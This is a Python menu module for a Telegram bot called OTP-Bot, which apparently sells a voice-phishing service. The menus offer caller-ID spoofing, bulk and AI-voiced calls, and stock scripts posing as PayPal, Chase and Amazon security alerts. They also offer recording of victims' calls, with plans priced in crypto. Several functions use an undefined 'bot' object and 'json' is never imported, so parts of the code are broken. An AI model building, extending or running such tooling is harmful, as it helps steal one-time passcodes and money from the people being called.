# handlers/menu.py
"""
Menu rendering functions for OTP-Bot-Telegram.
Provides consistent, styled Telegram menus with icons, rich formatting,
and dynamic status updates. All functions return InlineKeyboardMarkup objects.
"""
import logging
from typing import Optional, Dict, Any, List, Union

from telebot import types

from config import (
    MAIN_CHANNEL_URL,
    BACKUP_CHANNEL_URL,
    MAIN_CHANNEL_ID,
    BACKUP_CHANNEL_ID,
    PAYMENT_ADDRESSES,
    FREE_TRIAL_TOTAL,
)
from core.auth import (
    is_privileged_user,
    get_user_role_text,
    check_subscription,
    get_free_calls,
    get_purchase_count,
    get_panel_status_text,
)
from core.user_manager import is_full_premium
from core.files import read_user_file, user_conf_path
from premium import get_unused_premium_keys, get_key_stats
from twilio_service import get_current_call_sid, get_call_status

logger = logging.getLogger("OTP-Bot.menu")


def _get_bot():
    from bot import bot as telegram_bot
    return telegram_bot


def get_live_listen_event(user_id_str: str) -> str:
    """Return the latest live listen event message stored for the user."""
    try:
        event = read_user_file(user_id_str, "live_listen_event.txt", "").strip()
        return event
    except Exception:
        return ""


# ======================================================================
# Constants for UI
# ======================================================================
ICONS = {
    "call": "📞",
    "bulk": "⚡",
    "ai": "🧠",
    "account": "👑",
    "crack": "💥",
    "analytics": "📊",
    "support": "🛠",
    "channel": "📡",
    "vouches": "🤝",
    "shop": "💎",
    "back": "↩",
    "live": "🎧",
    "schedule": "📅",
    "loyalty": "🎁",
    "scripts": "📝",
    "key_admin": "🔑",
    "download": "📥",
}

# ======================================================================
# Menu rendering functions
# ======================================================================
def send_main_menu(
    chat_id: int,
    user,
    message_id: Optional[int] = None
) -> None:
    """
    Send the main premium panel menu.
    
    Args:
        chat_id: Telegram chat ID
        user: Telegram user object
        message_id: If provided, edit existing message instead of sending new
    """
    bot = _get_bot()
    status_text = get_panel_status_text(str(user.id))
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔱 <b>HOTTBOIIHITZZ PREMIUM PANEL v4.0</b> 🔱\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
        f"{status_text}\n\n"
        "🔥 <b>Premium Controls</b> — Fast access to calls, AI mode, and account tools.\n"
    )
    
    # UI: only show advanced premium features unlocked for full (purchased) premium users
    premium_active = is_full_premium(str(user.id))
    ai_label = f"{ICONS['ai']} AI MODE" if premium_active else f"{ICONS['ai']} AI MODE 🔒"
    crack_label = f"{ICONS['crack']} CRACK BLAST" if premium_active else f"{ICONS['crack']} CRACK BLAST 🔒"

    buttons = types.InlineKeyboardMarkup(row_width=3)
    
    # Row 1: Call actions
    buttons.row(
        types.InlineKeyboardButton(f"{ICONS['call']} START CALL", callback_data="start_call"),
        types.InlineKeyboardButton(f"{ICONS['bulk']} BULK CALL", callback_data="bulk_call"),
        types.InlineKeyboardButton(ai_label, callback_data="ai_mode"),
    )
    
    # Row 2: Account, Crack Blast, Analytics
    buttons.row(
        types.InlineKeyboardButton(f"{ICONS['account']} ACCOUNT", callback_data="account"),
        types.InlineKeyboardButton(crack_label, callback_data="crack_blast"),
        types.InlineKeyboardButton(f"{ICONS['analytics']} ANALYTICS", callback_data="analytics"),
    )
    
    # Row 3: Support, Channel, Live Listen
    buttons.row(
        types.InlineKeyboardButton(f"{ICONS['support']} SUPPORT", callback_data="support"),
        types.InlineKeyboardButton(f"{ICONS['channel']} CHANNEL", callback_data="channel"),
        types.InlineKeyboardButton(f"{ICONS['live']} LIVE LISTEN", callback_data="live_listen"),
    )
    
    # Row 4: Vouches, Schedule
    buttons.row(
        types.InlineKeyboardButton(f"{ICONS['vouches']} VOUCHES", callback_data="vouches"),
        types.InlineKeyboardButton(f"{ICONS['schedule']} SCHEDULE", callback_data="schedule_menu"),
    )
    
    # Row 5: Shop
    buttons.row(
        types.InlineKeyboardButton(f"{ICONS['shop']} SHOP", callback_data="open_shop"),
    )
    
    # Send or edit message
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    """
    Send the premium shop menu with plan options.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
    """
    bot = _get_bot()
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['shop']} <b>PREMIUM SHOP</b> {ICONS['shop']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>Elite access for pro operators:</b>\n\n"
        "💯 <b>Unlimited Fast Calls</b>\n"
        "— No daily limits, instant routing\n"
        "— Global reach with high delivery priority\n\n"
        "🛡️ <b>Full Spoofing Suite</b>\n"
        "— Custom caller IDs and identity masking\n"
        "— Pro-grade header control for safer delivery\n\n"
        "🤖 <b>AI MODE V2</b>\n"
        "— Advanced AI voice interaction\n"
        "— Natural conversation flow\n"
        "— Real-time response handling\n\n"
        "⚡ <b>Fast Response Engine</b>\n"
        "— One-click execution for instant launch\n"
        "— Optimized for speed and reliability\n\n"
        "💎 Each plan purchase also counts toward a free loyalty premium key. Reach 5 purchases to claim your token.\n\n"
        "Choose your plan:\n👇"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton("🎟️ 3 Hour Trial — $10", callback_data="plan_3hourtrial")
    )
    buttons.add(
        types.InlineKeyboardButton("💎 1 Day — $22", callback_data="plan_1day")
    )
    buttons.add(
        types.InlineKeyboardButton("💎 3 Days — $45", callback_data="plan_3days")
    )
    buttons.add(
        types.InlineKeyboardButton("💎 1 Week — $80", callback_data="plan_1week")
    )
    buttons.add(
        types.InlineKeyboardButton("♾️ Lifetime — $170", callback_data="plan_lifetime")
    )
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_wallet_menu(
    chat_id: int,
    plan_key: str,
    plan_name: str,
    price: str,
    message_id: Optional[int] = None,
) -> None:
    """
    Send wallet addresses for payment with click-to-copy buttons.
    
    Args:
        chat_id: Telegram chat ID
        plan_key: Plan identifier (e.g., "plan_1day")
        plan_name: Human-readable plan name
        price: Price string (e.g., "$16")
        message_id: If provided, edit existing message
    """
    bot = _get_bot()
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>PAYMENT ADDRESSES FOR: {plan_name} ({price})</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Click on any wallet address below to copy it:\n\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    
    # Add wallet buttons with click-to-copy
    for currency, address in PAYMENT_ADDRESSES.items():
        if address and not address.startswith("_your"):
            # Create clickable button for each wallet
            button_text = f"📋 {currency}"
            buttons.add(
                types.InlineKeyboardButton(
                    button_text,
                    callback_data=f"copy_wallet_{currency}"
                )
            )
            text += f"<b>{currency}</b>:\n<code>{address}</code>\n\n"
    
    text += (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ After payment, send your transaction proof:\n"
        "   • Transaction hash\n"
        "   • Screenshot\n"
        "   • Payment link\n\n"
        "Then click VERIFY PAYMENT below 👇\n"
    )
    
    buttons.add(
        types.InlineKeyboardButton("✅ VERIFY PAYMENT", callback_data=f"verify_payment_{plan_key}")
    )
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="open_shop")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_account_menu(
    chat_id: int,
    message_id: Optional[int] = None,
    user_id_str: Optional[str] = None,
) -> None:
    """
    Send the account center menu with loyalty, scripts, and key admin (if privileged).
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
        user_id_str: User ID for privilege checks
    """
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['account']} <b>HOTTBOIIHITZZ ACCOUNT CENTER</b> {ICONS['account']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "• View your premium status\n"
        "• Redeem loyalty rewards\n"
        "• Manage scripts and launch calls\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=2)
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['loyalty']} LOYALTY", callback_data="open_loyalty")
    )
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['scripts']} SCRIPTS", callback_data="open_scripts")
    )
    
    if user_id_str and is_privileged_user(user_id_str):
        buttons.add(
            types.InlineKeyboardButton(f"{ICONS['key_admin']} KEY ADMIN", callback_data="open_key_admin")
        )
    
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_loyalty_menu(
    chat_id: int,
    message_id: Optional[int] = None,
    user_id_str: Optional[str] = None,
) -> None:
    """
    Send the loyalty panel with purchase progress and premium key redemption.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
        user_id_str: User ID for loyalty data
    """
    if not user_id_str:
        user_id_str = str(chat_id)
    
    purchase_count = get_purchase_count(user_id_str)
    remaining = max(0, 5 - purchase_count)
    progress_bar = "🔷" * purchase_count + "▫️" * remaining
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['loyalty']} <b>HOTTBOIIHITZZ LOYALTY PANEL</b> {ICONS['loyalty']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Purchases:</b> <code>{purchase_count}/5</code>\n"
        f"<b>Progress:</b> {progress_bar}\n\n"
        f"<i>Collect 5 purchases to unlock a free premium key code.</i>\n\n"
        "• Redeem premium access instantly\n"
        "• Admin-generated keys give timed VIP access\n"
        "• Use the code below to activate your rewards\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton("✅ Shop Plans", callback_data="open_shop")
    )
    
    if purchase_count >= 5:
        buttons.add(
            types.InlineKeyboardButton(f"{ICONS['key_admin']} Redeem Premium Key", callback_data="redeem_premium_key")
        )
    else:
        buttons.add(
            types.InlineKeyboardButton(f"🛒 {remaining} more purchases to unlock", callback_data="open_shop")
        )
    
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="account")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_scripts_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    """
    Send the scripts manager menu.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
    """
    text = (
        "📚 <b>SCRIPT LIBRARY</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📌 <b>Default Scripts:</b>\n"
        "1. PayPal Security Alert\n"
        "2. Chase Bank Fraud Alert\n"
        "3. Amazon Account Verification\n\n"
        "📌 <b>My Saved Scripts:</b> (0)\n\n"
        "✨ Create New Script\n"
        "📋 Paste Custom Script\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("✨ CREATE NEW", callback_data="create_script"))
    buttons.add(types.InlineKeyboardButton("📋 PASTE CUSTOM", callback_data="paste_script_to_library"))
    buttons.add(types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="account"))
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_support_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    """
    Send the support menu with contact information.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
    """
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['support']} <b>SUPPORT CENTER</b> {ICONS['support']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Need help or admin assistance? Contact the admin directly now.\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton("💬 Contact Admin", url="https://t.me/hottboiihitzz")
    )
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_channel_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    """
    Send the channel menu with main and backup channel links.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
    """
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['channel']} <b>CHANNELS</b> {ICONS['channel']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Main Channel:</b> {MAIN_CHANNEL_URL}\n"
        f"<b>Backup Channel:</b> {BACKUP_CHANNEL_URL}\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_vouches_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    """
    Send the vouches menu.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
    """
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{ICONS['vouches']} <b>VOUCHES</b> {ICONS['vouches']}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Trusted reviews and social proof are coming soon.\n"
        "Stay ready for the next update.\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
    """
    Send the live listen panel with call status and download option.
    
    Args:
        chat_id: Telegram chat ID
        user_id_str: User ID for fetching call SID
    """
    sid = read_user_file(user_id_str, "call_sid.txt", "")
    if not sid:
        bot.send_message(chat_id, "❌ No active call session found. Start a call first to use Live Listen.")
        return
    
    # Fetch call status
    try:
        call_status = get_call_status(sid) or "unknown"
    except Exception:
        bot.send_message(chat_id, "❌ Unable to fetch call data")
        return
    
    status_labels = {
        "queued": "Queued",
        "ringing": "Ringing",
        "in-progress": "In Progress",
        "completed": "Completed",
        "failed": "Failed",
        "no-answer": "No Answer",
        "busy": "Busy",
        "canceled": "Canceled",
    }
    formatted_status = status_labels.get(call_status, call_status.replace("-", " ").title())
    
    lines = [
        f"{ICONS['live']} <b>LIVE LISTEN PANEL</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"• Status: <b>{formatted_status}</b>",
        "",
        "Monitoring is active while the call is in progress.",
        "If the caller answers, the call audio will be recorded and available below.",
    ]
    
    recording_path = user_conf_path(user_id_str) / "record.mp3"
    buttons = types.InlineKeyboardMarkup(row_width=1)
    
    if call_status in ["queued", "ringing", "in-progress"]:
        lines.append("\n✅ Monitoring the call now.")

    live_event = get_live_listen_event(user_id_str)
    if live_event:
        lines.append(f"\n<b>Latest live update:</b> {live_event}")

    if recording_path.exists():
        buttons.add(
            types.InlineKeyboardButton(f"{ICONS['download']} Download Recording", callback_data="download_recording")
        )
    
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    bot.send_message(
        chat_id,
        "\n".join(lines),
        reply_markup=buttons,
        parse_mode="HTML",
        disable_web_page_preview=True,
    )

def send_analytics_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
    """
    Send the analytics dashboard.
    
    Args:
        chat_id: Telegram chat ID
        message_id: If provided, edit existing message
        user_id_str: User ID for fetching call history
    """
    if not user_id_str:
        user_id_str = str(chat_id)
    
    # Load call history
    history_path = user_conf_path(user_id_str) / "call_history.json"
    history = []
    if history_path.exists():
        try:
            with open(history_path, "r") as f:
                history = json.load(f)
        except:
            pass
    
    total = len(history)
    completed = sum(1 for h in history if h.get("status") == "completed")
    failed = sum(1 for h in history if h.get("status") in ("failed", "busy", "no-answer"))
    success_rate = round(completed / total * 100, 2) if total > 0 else 0
    
    text = (
        f"{ICONS['analytics']} <b>ANALYTICS DASHBOARD</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📞 Total Calls: <code>{total}</code>\n"
        f"✅ Successful: <code>{completed}</code>\n"
        f"❌ Failed: <code>{failed}</code>\n"
        f"📈 Success Rate: <code>{success_rate}%</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton("🔄 Refresh", callback_data="analytics")
    )
    buttons.add(
        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
    )
    
    if message_id:
        try:
            bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logger.debug(f"Edit failed, sending new message: {e}")
            bot.send_message(
                chat_id,
                text,
                reply_markup=buttons,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
    else:
        bot.send_message(
            chat_id,
            text,
            reply_markup=buttons,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

# ======================================================================
# Export all menu functions
# ======================================================================
__all__ = [
    'send_main_menu',
    'send_shop_menu',
    'send_wallet_menu',
    'send_account_menu',
    'send_loyalty_menu',
    'send_scripts_menu',
    'send_support_menu',
    'send_channel_menu',
    'send_vouches_menu',
    'send_live_listen_panel',
    'send_analytics_menu',
]